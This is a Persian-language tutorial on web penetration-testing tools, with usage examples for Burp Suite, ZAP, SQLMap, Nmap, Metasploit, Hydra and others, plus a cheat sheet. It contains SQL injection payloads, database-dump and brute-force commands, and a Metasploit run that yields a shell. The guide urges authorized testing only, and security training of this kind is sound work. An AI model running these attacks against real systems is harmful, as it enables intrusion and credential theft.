# 🛠️ راهنمای جامع ابزارهای هک وب (Web Hacking Tools)

<div dir="rtl">

## 👋 مقدمه

برای یادگیری و تست امنیت وب، نیاز به ابزارهای حرفه‌ای داری! این راهنمای کامل معروف‌ترین و بهترین ابزارها رو معرفی می‌کنه! 🎯

**توجه:** این ابزارها فقط برای یادگیری و تست سایت‌های خودت یا با مجوز استفاده کن! ❌🚫

---

## 🎯 دسته‌بندی ابزارها

### 1️⃣ Proxy Tools (ابزارهای Proxy)
### 2️⃣ Vulnerability Scanners (اسکنرهای آسیب‌پذیری)
### 3️⃣ Exploitation Tools (ابزارهای Exploit)
### 4️⃣ Information Gathering (جمع‌آوری اطلاعات)
### 5️⃣ Password Tools (ابزارهای پسورد)
### 6️⃣ Browser Extensions (افزونه‌های مرورگر)

---

## 🔥 ابزارهای اصلی و معروف

### 1. Burp Suite 👑

**بهترین و معروف‌ترین ابزار تست امنیت وب!**

#### چیه این Burp Suite؟ 🤔

یه Proxy قدرتمند که بین مرورگر و سرور می‌شینه و همه چیز رو بهت نشون میده! مثل یه دوربین مخفی که می‌بینه چه اطلاعاتی رد و بدل میشه! 🕵️

#### قابلیت‌های اصلی:

**🔸 Proxy**
```
مرورگر → Burp Suite → سرور
         ↓
    می‌تونی ببینی
    می‌تونی تغییر بدی
    می‌تونی تکرار کنی
```

**مثال:**
```http
# درخواست اصلی
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": "admin",
    "password": "12345"
}

# تو Burp می‌تونی تغییرش بدی به:
{
    "username": "admin' OR '1'='1",
    "password": "anything"
}
```

**🔸 Repeater** - تکرار درخواست‌ها
```
1. درخواستی رو بگیر
2. تغییرش بده
3. دوباره بفرست
4. نتیجه رو ببین
5. تکرار تا پیدا کنی!
```

**🔸 Intruder** - حملات خودکار
```python
# مثال: Brute Force پسورد
Payloads:
- password123
- admin
- qwerty
- 123456
...

Burp خودکار همه رو امتحان می‌کنه! 🚀
```

**🔸 Scanner** (فقط نسخه Pro)
```
خودکار سایت رو اسکن می‌کنه و آسیب‌پذیری پیدا می‌کنه!
- SQL Injection ✅
- XSS ✅
- CSRF ✅
- و صدها مورد دیگه!
```

**🔸 Decoder** - رمزگشایی
```
Base64: YWRtaW4= → admin
URL Encode: %41%64%6D%69%6E → Admin
HTML: &lt;script&gt; → <script>
```

**🔸 Comparer** - مقایسه
```
Response 1  vs  Response 2
↓
تفاوت‌ها رو نشون میده!
```

#### نصب و راه‌اندازی:

```bash
# دانلود
https://portswigger.net/burp/communitydownload

# راه‌اندازی
java -jar burploader.jar

# تنظیم مرورگر
1. نصب افزونه FoxyProxy
2. تنظیم Proxy: 127.0.0.1:8080
3. نصب گواهی Burp
```

#### نسخه‌ها:
- **Community (رایگان):** برای یادگیری عالیه! ✅
- **Pro ($399/سال):** برای حرفه‌ای‌ها 💰

#### مثال کاربردی:

```
سناریو: تست SQL Injection

1. باز کن Burp و Intercept رو روشن کن
2. توی مرورگر لاگین کن
3. Burp درخواست رو می‌گیره:
   POST /login
   username=admin&password=test

4. بفرست به Repeater
5. تغییر بده:
   username=admin' OR '1'='1--&password=test

6. بفرست و ببین چی میشه!

نتیجه: اگه لاگین شدی، سایت آسیب‌پذیره! 🎯
```

---

### 2. OWASP ZAP (Zed Attack Proxy) 🦊

**بهترین جایگزین رایگان Burp Suite!**

#### مزایا:
- ✅ کاملا رایگان و Open Source
- ✅ Scanner خودکار داره
- ✅ رابط کاربری ساده‌تر از Burp
- ✅ API داره برای Automation

#### نصب:
```bash
# Linux
sudo apt install zaproxy

# یا دانلود از:
https://www.zaproxy.org/download/

# اجرا
zap.sh
```

#### قابلیت‌های اصلی:

**🔸 Active Scan**
```
خودکار سایت رو اسکن می‌کنه!
هر صفحه رو با هزاران payload تست می‌کنه!
```

**🔸 Passive Scan**
```
فقط گوش میده و تحلیل می‌کنه
بدون ارسال Payload
سبک‌تر و کم‌خطرتر!
```

**🔸 Fuzzer**
```
Fuzzing خودکار:
/api/user/1   ✅
/api/user/2   ✅
/api/user/3   ✅
...
/api/user/999 ✅
```

**🔸 Scripts**
```javascript
// می‌تونی Script بنویسی!
// مثال: پیدا کردن API Key توی Response

function scan(msg) {
    var body = msg.getResponseBody().toString();
    if (body.match(/api[_-]?key/i)) {
        alert("API Key پیدا شد! 🚨");
    }
}
```

#### مثال استفاده:

```
1. باز کن ZAP
2. URL سایت رو بنویس
3. بزن روی "Automated Scan"
4. صبر کن (ممکنه چند ساعت طول بکشه!)
5. گزارش کامل آسیب‌پذیری‌ها رو می‌گیری! 📊
```

---

### 3. SQLMap 💉

**بهترین ابزار برای SQL Injection!**

#### نصب:
```bash
# Linux (معمولا از قبل هست)
sudo apt install sqlmap

# یا
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
```

#### استفاده:

**مثال ۱: تست ساده**
```bash
# تست یه URL
sqlmap -u "http://example.com/product.php?id=1"

# نتیجه:
# ✅ Parameter 'id' is vulnerable!
# Database: MySQL 5.7.0
```

**مثال ۲: دریافت دیتابیس‌ها**
```bash
# لیست دیتابیس‌ها
sqlmap -u "http://example.com/product.php?id=1" --dbs

# نتیجه:
# available databases [3]:
# [*] information_schema
# [*] shop_db
# [*] users_db
```

**مثال ۳: دریافت جداول**
```bash
# جداول دیتابیس shop_db
sqlmap -u "http://example.com/product.php?id=1" -D shop_db --tables

# نتیجه:
# [*] products
# [*] users
# [*] orders
```

**مثال ۴: دریافت داده‌ها**
```bash
# محتوای جدول users
sqlmap -u "http://example.com/product.php?id=1" -D shop_db -T users --dump

# نتیجه:
# +----+----------+------------------+
# | id | username | password         |
# +----+----------+------------------+
# | 1  | admin    | 5f4dcc3b5aa765d6 |
# | 2  | user1    | e10adc3949ba59ab |
# +----+----------+------------------+
```

**مثال ۵: با POST Request**
```bash
# POST data
sqlmap -u "http://example.com/login.php" \
    --data="username=admin&password=test"

# یا از فایل Burp
sqlmap -r request.txt
```

#### آپشن‌های مفید:

```bash
# سطح و ریسک بالاتر
sqlmap -u "URL" --level=5 --risk=3

# دور زدن WAF
sqlmap -u "URL" --tamper=space2comment

# استفاده از Proxy (Burp)
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Interactive SQL Shell
sqlmap -u "URL" --sql-shell

# دریافت همه چیز!
sqlmap -u "URL" --dump-all --batch
```

---

### 4. Nikto 🔍

**اسکنر آسیب‌پذیری وب سرور!**

#### نصب:
```bash
sudo apt install nikto

# یا
git clone https://github.com/sullo/nikto.git
```

#### استفاده:

```bash
# اسکن ساده
nikto -h http://example.com

# اسکن با پورت مشخص
nikto -h http://example.com:8080

# اسکن HTTPS
nikto -h https://example.com

# اسکن با Proxy
nikto -h http://example.com -useproxy http://127.0.0.1:8080

# ذخیره نتیجه
nikto -h http://example.com -o report.html -Format htm
```

#### چی پیدا می‌کنه؟

```
✅ سرور قدیمی و آسیب‌پذیر
✅ فایل‌های حساس (/admin, /.git, /backup.sql)
✅ پیکربندی نادرست
✅ نسخه نرم‌افزارها
✅ Security Headers نداشته
✅ Default files و directories
```

---

### 5. Nmap 🗺️

**اسکنر شبکه و پورت!**

#### نصب:
```bash
sudo apt install nmap
```

#### استفاده:

```bash
# اسکن پورت‌های باز
nmap example.com

# اسکن سریع
nmap -F example.com

# اسکن کامل
nmap -p- example.com  # همه 65535 پورت!

# شناسایی سرویس‌ها
nmap -sV example.com

# شناسایی OS
nmap -O example.com

# اسکن با Script
nmap --script=http-enum example.com

# اسکن آسیب‌پذیری
nmap --script vuln example.com
```

#### مثال خروجی:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1
80/tcp   open  http     Apache 2.4.29
443/tcp  open  https    Apache 2.4.29
3306/tcp open  mysql    MySQL 5.7.0
```

---

### 6. Metasploit Framework 💣

**فریمورک قدرتمند Exploitation!**

#### نصب:
```bash
# Kali Linux (از قبل هست)
msfconsole

# یا نصب
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

#### استفاده:

```bash
# باز کردن
msfconsole

# جستجوی exploit
msf6 > search apache

# انتخاب exploit
msf6 > use exploit/multi/http/apache_normalize_path

# تنظیمات
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 80

# اجرا
msf6 > exploit

# اگه موفق بشه:
meterpreter > shell
# حالا Shell داری! 🎉
```

---

### 7. Gobuster 📁

**پیدا کردن directories و files مخفی!**

#### نصب:
```bash
sudo apt install gobuster

# یا
go install github.com/OJ/gobuster/v3@latest
```

#### استفاده:

```bash
# پیدا کردن directories
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# پیدا کردن فایل‌های با extension خاص
gobuster dir -u http://example.com -w wordlist.txt -x php,html,js

# پیدا کردن subdomain
gobuster dns -d example.com -w subdomains.txt

# استفاده از Cookie
gobuster dir -u http://example.com -w wordlist.txt -c "session=abc123"
```

#### خروجی:

```
/admin                (Status: 301)
/backup.sql           (Status: 200)
/login.php            (Status: 200)
/.git/config          (Status: 200) 🚨
```

---

### 8. Sublist3r 🔍

**پیدا کردن subdomain ها!**

#### نصب:
```bash
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt
```

#### استفاده:

```bash
# پیدا کردن subdomains
python sublist3r.py -d example.com

# نتیجه:
# www.example.com
# api.example.com
# admin.example.com
# dev.example.com
# test.example.com  ← این خطرناکه! 🎯
```

---

### 9. John the Ripper 🔨

**شکستن پسورد hash!**

#### نصب:
```bash
sudo apt install john
```

#### استفاده:

```bash
# شکستن hash
john hashes.txt

# با wordlist مشخص
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# نمایش پسوردهای پیدا شده
john --show hashes.txt
```

#### مثال:

```bash
# فایل hashes.txt:
admin:5f4dcc3b5aa765d61d8327deb882cf99

# اجرا:
john hashes.txt

# نتیجه:
admin:password  ← پیدا شد! 🎉
```

---

### 10. Hydra 💧

**Brute Force برای لاگین!**

#### نصب:
```bash
sudo apt install hydra
```

#### استفاده:

```bash
# HTTP Form Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    example.com http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# SSH Brute Force
hydra -l root -P passwords.txt ssh://192.168.1.1

# FTP Brute Force
hydra -l user -P passwords.txt ftp://192.168.1.1
```

---

## 🌐 افزونه‌های مرورگر

### 1. Wappalyzer 🔍
```
نشون میده سایت با چه تکنولوژی‌هایی ساخته شده:
- Framework: Laravel
- Server: Nginx
- CDN: Cloudflare
- Analytics: Google Analytics
```

### 2. Cookie-Editor 🍪
```
مدیریت و ویرایش Cookie ها
- مشاهده همه Cookie ها
- ویرایش
- حذف
- Export/Import
```

### 3. HackTools 🛠️
```
ابزارهای کوچک مفید:
- Reverse Shell Generator
- XSS Payloads
- SQL Injection Cheat Sheet
- Hash Generator
```

### 4. FoxyProxy 🦊
```
مدیریت Proxy:
- سوییچ سریع بین Proxy ها
- Burp Suite ✅
- ZAP ✅
```

---

## 📋 Wordlists مهم

```bash
# مکان پیش‌فرض در Kali Linux
/usr/share/wordlists/

# معروف‌ترین:
rockyou.txt          # 14 میلیون پسورد!
dirb/common.txt      # directories معمول
dirbuster/           # wordlist های بزرگ
SecLists/            # مجموعه کامل!
```

#### دانلود SecLists:
```bash
git clone https://github.com/danielmiessler/SecLists.git
```

---

## 🎯 یه سناریوی کامل

**هدف: تست امنیت example.com**

### مرحله ۱: Information Gathering
```bash
# Subdomain Discovery
sublist3r -d example.com

# Port Scanning
nmap -sV example.com

# Directory Enumeration
gobuster dir -u http://example.com -w common.txt

# Technology Detection
# استفاده از Wappalyzer
```

### مرحله ۲: Vulnerability Scanning
```bash
# Web Vulnerability Scan
nikto -h http://example.com

# Automated Scan
zap-cli quick-scan http://example.com
```

### مرحله ۳: Manual Testing با Burp
```
1. Setup Burp Proxy
2. Browse the website
3. Analyze requests در Proxy History
4. Test parameters برای:
   - SQL Injection
   - XSS
   - IDOR
   - Authentication Bypass
```

### مرحله ۴: Exploitation
```bash
# اگه SQL Injection پیدا کردی:
sqlmap -u "http://example.com/product?id=1" --dbs

# اگه Directory Listing پیدا کردی:
wget -r http://example.com/backup/

# اگه Login Form آسیب‌پذیر بود:
hydra -l admin -P rockyou.txt example.com http-post-form "..."
```

---

## 🎓 نکات مهم

### ✅ DO (انجام بده):
- فقط روی سایت‌های خودت تست کن
- یا با مجوز کتبی
- یا روی Lab های قانونی (HTB, THM)
- همیشه Log بگیر از کارات
- یاد بگیر چرا و چطور کار می‌کنن

### ❌ DON'T (انجام نده):
- روی سایت‌های واقعی بدون مجوز
- DoS Attack
- تخریب داده‌ها
- سوء استفاده از اطلاعات

---

## 📚 منابع آموزشی

### ویدیوها:
- [IppSec - HackTheBox Walkthroughs](https://www.youtube.com/c/ippsec)
- [The Cyber Mentor](https://www.youtube.com/c/TheCyberMentor)
- [STÖK](https://www.youtube.com/c/STOKfredrik)

### داکیومنتیشن:
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 🎁 Cheat Sheet کامل

```bash
# ============ Reconnaissance ============
nmap -sV -sC example.com
sublist3r -d example.com
whois example.com

# ============ Scanning ============
nikto -h http://example.com
gobuster dir -u http://example.com -w common.txt
wpscan --url http://example.com

# ============ Exploitation ============
sqlmap -u "URL?id=1" --dbs
hydra -l admin -P pass.txt example.com http-post-form

# ============ Post-Exploitation ============
msfconsole
use exploit/...
set PAYLOAD ...
exploit
```

---

**یادت باشه: ابزار خوبه، ولی فهمیدن مهم‌تره! اول یاد بگیر چطور کار می‌کنه، بعد ابزار استفاده کن! 🧠🛠️**

**"A tool is only as good as the person using it!" (ابزار به خوبی کسیه که ازش استفاده می‌کنه!)**

</div>
